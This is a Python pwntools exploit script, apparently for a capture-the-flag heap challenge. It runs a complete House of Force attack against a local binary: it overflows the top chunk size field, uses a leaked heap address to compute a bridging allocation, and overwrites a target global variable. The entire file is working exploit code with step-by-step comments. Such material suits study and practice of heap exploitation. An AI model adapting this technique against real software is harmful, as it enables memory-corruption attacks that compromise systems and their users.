#!/usr/bin/env python3

from pwn import *
import struct


def create_note(conn, size, note):
	conn.sendafter(b'Enter an option:', b'1')
	conn.sendafter(b'Enter an option:', str(size))
	conn.sendafter(b'Press enter to stop.\n', note)


def delete_note(conn, index):
	conn.sendafter('Enter an option:', '2')
	conn.sendafter('Enter an option:', str(index))


if __name__ == '__main__':
	binary = ELF('./a.out')
	context.terminal = ["/mnt/c/wsl_terminal/wsl-terminal/open-wsl.exe", "-e"]
	# conn = gdb.debug("./a.out", '''
	# init-pwndbg
	# b *create_note+290
	# c
	# ''')
	conn = process("./a.out")

	# Step 1: Performing the overflow into the top_chunk size field.
	create_note(conn, 0x28, b'A'* 0x28 + p64(0xffffffffffffffff))

	# Step 2: Allocate a "bridging" chunk to get close to our target pointer.
	conn.recvuntil(b'@ 0x')
	chunk_ptr = int(conn.recvline().strip(), 16)
	chunk_start = chunk_ptr - 16
	current_top = chunk_start + 0x30 #size chunk

	# addr of leet var
	round2_chunk_size = binary.sym.leet - current_top - 32
	create_note(conn, round2_chunk_size, b'A')
	# Step 3: Allocate the chunk that overlaps with our target address. This is where we overwrite the target.
	create_note(conn, 0x28, b'A'*8)
	# Continue interacting with the process.
	conn.interactive()